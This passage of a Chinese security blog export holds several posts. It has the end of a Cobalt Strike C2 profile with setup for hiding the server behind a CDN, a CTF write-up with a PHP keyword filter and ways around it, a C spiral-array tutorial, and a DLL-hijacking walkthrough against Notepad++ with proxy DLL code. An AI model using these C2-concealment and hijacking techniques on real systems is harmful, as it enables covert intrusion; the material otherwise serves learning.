&quot;XMLHttpRequest&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line">        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随后将这个profile文件上传到服务器上面去，加载这个profile文件</p>
<p><code>./teamserver ip 密码 ./profile</code></p>
<h1 id="实验能否上线"><a href="#实验能否上线" class="headerlink" title="实验能否上线"></a>实验能否上线</h1><p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230303190918151.png" alt="image-20230303190918151"></p>
<p>然后创建一个监听器</p>
<p>打码的地方填写自己的域名，因为cloudflare的原因这里端口的设置需要注意以下：<br>若是http，则只能设置80,8080,8880,2052,2082,2086,2095这些端口号<br>若是https，则只能443,2053,2083,2087,2096,8443 这些端口号</p>
<p>其中的httphost记得填写自己的域名。</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230303191111328.png" alt="image-20230303191111328"></p>
<p>成功使用cdn上线，而且可以看到外网ip是不断在变化的。</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>ctfhub find_it</title>
    <url>/2022/01/10/ctfhub-find-it/</url>
    <content><![CDATA[<h1 id="ctfhub-find-it"><a href="#ctfhub-find-it" class="headerlink" title="ctfhub find_it"></a>ctfhub find_it</h1><p>在robots.php中发现提示</p>
<p>然后访问.文件.swp的时候发现备份源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Really easy...</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = fread(<span class="variable">$file</span>,filesize(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hack</span>=fopen(<span class="string">&quot;hack.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line">fclose(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现代码中把falg写入了hack.php中</p>
<p>利用show_source()函数将文件读出来。</p>
<p>再或者用大小写绕过这种没有忽略大小写的preg_match System()</p>
<p><a href="https://writeup.ctfhub.com/Challenge/2021/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/Web/oKTHZCKnTRgZzifYg5twqZ.html">find_it | CTFHub</a></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>c语言之螺旋数组</title>
    <url>/2023/10/10/c%E8%AF%AD%E8%A8%80%E4%B9%8B%E8%9E%BA%E6%97%8B%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1 id="c语言之螺旋数组"><a href="#c语言之螺旋数组" class="headerlink" title="c语言之螺旋数组"></a>c语言之螺旋数组</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我看到很多回忆题目都写了螺旋数组，20年之前是没有的，所以我们现在学习一下c语言中的螺旋数组，分为四种。</p>
<p>按方向分，分为顺时针和逆时针。按起始顺序分，分为中间开始（太难了，以前的也没考过从中间开始的）和开头开始。排列组合后分为四种。</p>
<p>我一定要成功！！考研真的太痛苦了，不想来第二遍了，整个人的生活都停下来了，就为了这么个东西，太太太太太太太烦人了，现在越来越想躺平了，要是以后生活都这么痛苦的话我都不知道怎么活😋。</p>
<h1 id="螺旋数组的编写"><a href="#螺旋数组的编写" class="headerlink" title="螺旋数组的编写"></a>螺旋数组的编写</h1><h2 id="开始之顺时针"><a href="#开始之顺时针" class="headerlink" title="开始之顺时针"></a>开始之顺时针</h2><p><img src="/2023/10/10/c%E8%AF%AD%E8%A8%80%E4%B9%8B%E8%9E%BA%E6%97%8B%E6%95%B0%E7%BB%84/image-20231009182256595.png" alt="image-20231009182256595"></p>
<p>用这种方式的螺旋数组，在看了思路之后，我会尝试自己写出螺旋数组。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">5</span>][<span class="number">5</span>];<span class="comment">//定义一个5x5的数组</span></span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">0</span>, b=<span class="number">4</span>,c=<span class="number">4</span>,d=<span class="number">0</span>;<span class="comment">//定义了4个边界</span></span><br><span class="line">	<span class="comment">//其中a为上边界，b为右边界，c为下边界，d为左边界</span></span><br><span class="line">	<span class="keyword">int</span> item = <span class="number">1</span>;<span class="comment">//定义一个元素，用来给数组赋值</span></span><br><span class="line">	<span class="keyword">while</span> (a&lt;=c&amp;&amp;d&lt;=b) &#123;</span><br><span class="line">		<span class="comment">//上行</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = d; i &lt;= b; i++) &#123;</span><br><span class="line">			arr[a][i] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		a++;<span class="comment">//上边界缩小</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//右列</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = a; i &lt;= c; i++) &#123;</span><br><span class="line">			arr[i][b] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		b--;<span class="comment">//右边界缩小</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//下行</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = b; i &gt;= d; i--) &#123;</span><br><span class="line">			arr[c][i] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		c--;<span class="comment">//下边界缩小</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//左列</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = c; i &gt;= a; i--) &#123;</span><br><span class="line">			arr[i][d] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		d++;<span class="comment">//左边界缩小</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出数组</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, arr[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/10/c%E8%AF%AD%E8%A8%80%E4%B9%8B%E8%9E%BA%E6%97%8B%E6%95%B0%E7%BB%84/image-20231009185741343.png" alt="image-20231009185741343"></p>
<p>w芜湖，其方法就是，不断收缩边界，达到边界的时候转为下一个边界即可。</p>
<h2 id="开始之逆时针"><a href="#开始之逆时针" class="headerlink" title="开始之逆时针"></a>开始之逆时针</h2><p>国服逆时针！</p>
<p><img src="/2023/10/10/c%E8%AF%AD%E8%A8%80%E4%B9%8B%E8%9E%BA%E6%97%8B%E6%95%B0%E7%BB%84/image-20231009190321828.png" alt="image-20231009190321828"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">5</span>][<span class="number">5</span>];<span class="comment">//定义一个5x5的数组</span></span><br><span class="line">	<span class="keyword">int</span> shang = <span class="number">0</span>, zuo = <span class="number">0</span>, you = <span class="number">4</span>, xia = <span class="number">4</span>;<span class="comment">//定义国服边界</span></span><br><span class="line">	<span class="keyword">int</span> item = <span class="number">1</span>;<span class="comment">//定义一个元素，用来给数组赋值</span></span><br><span class="line">	<span class="keyword">while</span> (shang &lt;= xia &amp;&amp; zuo &lt;= you) &#123;<span class="comment">//国服条件</span></span><br><span class="line">		<span class="comment">//左列</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = shang; i &lt;= xia; i++) &#123;</span><br><span class="line">			arr[i][zuo] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		zuo++;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//下行</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = zuo; i &lt;= you; i++) &#123;</span><br><span class="line">			arr[xia][i] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		xia--;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//右列</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = xia; i &gt;= shang; i--) &#123;</span><br><span class="line">			arr[i][you] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		you--;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//上行</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = you; i &gt;= zuo; i--) &#123;</span><br><span class="line">			arr[shang][i] = item;</span><br><span class="line">			item++;</span><br><span class="line">		&#125;</span><br><span class="line">		shang++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//输出数组</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, arr[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/10/c%E8%AF%AD%E8%A8%80%E4%B9%8B%E8%9E%BA%E6%97%8B%E6%95%B0%E7%BB%84/image-20231009191150189.png" alt="image-20231009191150189"></p>
<p>我还专门改成偶数了，这个代码同样是有用的。</p>
<p><img src="/2023/10/10/c%E8%AF%AD%E8%A8%80%E4%B9%8B%E8%9E%BA%E6%97%8B%E6%95%B0%E7%BB%84/image-20231009192033123.png" alt="image-20231009192033123"></p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>dll劫持技术入门及实践</title>
    <url>/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h1 id="dll劫持技术入门及实践"><a href="#dll劫持技术入门及实践" class="headerlink" title="dll劫持技术入门及实践"></a>dll劫持技术入门及实践</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。 在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件。</p>
<p>在windows平台下，很多应用程序的很多功能是相似的，抛去ui等等来说，大致的功能都差不多，比如都得调用窗口，都得调用内存管理的模块来分配内存，都得调用io模块去进行文件操作，读写文件等等，这些模块的具体表现就是DLL文件。</p>
<p>Windows操作系统通过“DLL路径搜索目录顺序”和“Know DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DLL路径搜索目录顺序：</span><br><span class="line">1.程序所在目录</span><br><span class="line">2.程序加载目录（SetCurrentDirectory）</span><br><span class="line">3.系统目录即 SYSTEM32 目录</span><br><span class="line">4.16位系统目录即 SYSTEM 目录</span><br><span class="line">5.Windows目录</span><br><span class="line">6.PATH环境变量中列出的目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Know DLLs注册表项:</span><br><span class="line">Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。</span><br><span class="line">Know DLLs注册表项的路径为HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</span><br></pre></td></tr></table></figure>

<p>展示一个vs生成的dll文件模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule, // 模块句柄</span><br><span class="line">                       DWORD  ul_reason_for_call, // 调用原因</span><br><span class="line">                       LPVOID lpReserved // 参数保留</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call) // 根据调用原因选择不不同的加载方式</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH: // DLL被某个程序加载</span><br><span class="line">    case DLL_THREAD_ATTACH: // DLL被某个线程加载</span><br><span class="line">    case DLL_THREAD_DETACH: // DLL被某个线程卸载</span><br><span class="line">    case DLL_PROCESS_DETACH: //DLL被某个程序卸载</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="手动劫持"><a href="#手动劫持" class="headerlink" title="手动劫持"></a>手动劫持</h1><h2 id="劫持应用中没有的dll"><a href="#劫持应用中没有的dll" class="headerlink" title="劫持应用中没有的dll"></a>劫持应用中没有的dll</h2><p>根据网上教程做的，选的是notepad++ 6.6.6版本，做一个手动劫持的实验。</p>
<p>首先在虚拟机上装好这些东西（cff不用也可以，我后面用的，提前装了）</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930135911913.png" alt="image-20220930135911913"></p>
<p>然后Procmon.exe设置好相应的过滤器</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930140008388.png" alt="image-20220930140008388"></p>
<p>这样设置之后我半天没有找到相应的进程，所以我自己改了一下过滤规则，还换了个processmonitor的版本</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930151634184.png" alt="image-20220930151634184"></p>
<p>在进程中我们需要找到一个有loadlibrary相关的API的dll</p>
<p>这里的Msimg32.DLL</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930151929423.png" alt="image-20220930151929423"></p>
<p>就加载了这个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么为什么要找一个有loadlibrary相关的API的dll呢？</span><br><span class="line">是因为如果该dll的调用栈中存在有 LoadLibrary(Ex)，说明这个DLL是被进程所动态加载的。在这种利用场景下，伪造的DLL文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在DLL被成功加载之后的事情。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载dll动态库时LoadLibrary与LoadLibraryEx的区别：</span><br><span class="line">LoadLibrary和LoadLibraryEx一个是本地加载，一个是远程加载</span><br><span class="line">若DLL不在调用方的同一目录下，可以用LoadLibrary(L&quot;DLL绝对路径&quot;)加载。</span><br><span class="line">但若被调DLL内部又调用另外一个DLL，此时调用仍会失败。解决办法是用LoadLibraryEx：</span><br><span class="line">LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);</span><br><span class="line">通过指定LOAD_WITH_ALTERED_SEARCH_PATH，让系统DLL搜索顺序从DLL所在目录开始。</span><br></pre></td></tr></table></figure>

<p>这样看来这个Msimg32.DLL就符合dll劫持的条件，我们通过dll模板去写一个加的Msimg32.DLL。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        system(&quot;calc&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用cs生成x86的之后替换掉。随后就可以发现，成功了！</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930173924370.png" alt="image-20220930173924370"></p>
<p>好耶(<em>^▽^</em>)</p>
<h2 id="劫持应用中存在的dll"><a href="#劫持应用中存在的dll" class="headerlink" title="劫持应用中存在的dll"></a>劫持应用中存在的dll</h2><p>将这个改成成功</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930175356979.png" alt="image-20220930175356979"></p>
<p>然后找到一个名为SciLexer.dll的文件，发现他也加载了loadlibrary，</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930181205935.png" alt="image-20220930181205935"></p>
<p>我超肚子好痛o(╥﹏╥)o</p>
<p>然后这里要用到一个工具 apimonitor这工具</p>
<p>apimonitor 可让您监控和控制应用程序和服务发出的 API 调用。它是查看应用程序和服务如何工作或跟踪您自己的应用程序中存在的问题的强大工具。</p>
<p>使用这个工具是为了弄清楚，这个dll在实际运行的过程中调用的哪个导出函数，这个我们就需要使用apimonitor来进行监控。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么为什么要用寻找导出函数呢？，是因为导出函数中的方法是可以被外部访问的。</span><br><span class="line"></span><br><span class="line">.DLL 文件的布局与 .exe 文件非常相似，但有一个重要的差异：DLL 文件包含导出表。导出表包含 DLL 导出到其他可执行文件的每个函数的名称。这些函数是 DLL 中的入口点；只有导出表中的导出函数可由其他可执行文件访问。DLL 中的任何其他函数都是 DLL 私有的。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930183926803.png" alt="image-20220930183926803"></p>
<p>打开工具后，勾上这几个</p>
<p>随后挂钩notepad</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930184724392.png" alt="image-20220930184724392"></p>
<p>这时候就可以拿到他的导出函数了</p>
<p>之后就可以开始编写dll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编写dll时，有个重要的问题需要解决，那就是函数重命名——Name-Mangling。C++的编译器通常会对函数名和变量名进行改编，这在链接的时候会出现一个严重的问题，假如dll是C++写的，可执行文件是C写的。在构建dll的时候，编译器会对函数名进行改编，但是在构建可执行文件的时候，编译器不会对函数名进行改。这个时候当链接器试图链接可执行文件的时候，会发现可执行文件引用了一个不存在的符号并报错，那么如何解决这个问题呢？有几种方法。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种是用extern &quot;C&quot;、来告诉编译器不要对变量名和函数名进行改编，这样用C,C++或者任何语言编写可执行模块都可以访问该变量或者该函数。</span><br><span class="line"></span><br><span class="line">第二种是给项目创建一个.def文件，.def文件会包含一下类似下面的EXPORTS段</span><br><span class="line">EXPORTS</span><br><span class="line">Myfunc</span><br><span class="line">当链接器解析这个.def文件的时候，会发现被改编后的函数名比如_Myfunc@2和没被改编的函数名Myfunc都被导出，这俩函数名是匹配的（不考虑改编），然后链接器就会用.def文件中定义的名称也就是Myfunc来导出函数，而不是用_Myfunc@2。</span><br><span class="line"></span><br><span class="line">第三种是还可以在源文件中添加# pragma comment(linker, &quot;/export:[Exports Name]=[Mangling Name]&quot;)</span><br><span class="line">比如 # pragma comment(linker, &quot;/export:Myfunc=_Myfunc@2&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">还需要知道</span><br><span class="line">导出：__declspec(dllexport)</span><br><span class="line">导入：__declspec(dllimport)</span><br></pre></td></tr></table></figure>

<p>然后编译一下以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) void shiyixia();</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        system(&quot;calc&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void shiyixa()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>替换掉文件夹中的那个东西</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930191558372.png" alt="image-20220930191558372"></p>
<p>打开之后，直接就弹了窗，但是没有notepad弹出来，</p>
<p>把代码中间的cala删掉</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20220930191722491.png" alt="image-20220930191722491"></p>
<p>去掉之后就失败了。当然这是个试错的过程，我们还可以使用dll转发技术。</p>
<p>保留原dll，恶意的dll的原因是要做两件事，一件事就是执行恶意代码，第二件事情就是转到正常的dll，来维持程序的正常运行。</p>
<p>但是转发依然没有成功，不过还是弹了计算机就对了。下面是转发的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line"># include &quot;pch.h&quot;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) void Scintilla_DirectFunction();</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        system(&quot;calc&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Scintilla_DirectFunction()</span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hDll = LoadLibrary(L&quot;SciLexer_re.dll&quot;);</span><br><span class="line">    if (hDll)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        //typedef 是定义了一个新的类型</span><br><span class="line">        //DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD</span><br><span class="line">        //定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针</span><br><span class="line">        typedef DWORD(WINAPI* EXPFUNC)();</span><br><span class="line">        EXPFUNC expFunc = NULL;</span><br><span class="line">        expFunc = (EXPFUNC)GetProcAddress(hDll, &quot;Scintilla_DirectFunction&quot;);</span><br><span class="line">        if (expFunc)</span><br><span class="line">        &#123;</span><br><span class="line">            expFunc();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="使用工具劫持"><a href="#使用工具劫持" class="headerlink" title="使用工具劫持"></a>使用工具劫持</h1><h2 id="直接转发"><a href="#直接转发" class="headerlink" title="直接转发"></a>直接转发</h2><p>这里来劫持qq</p>
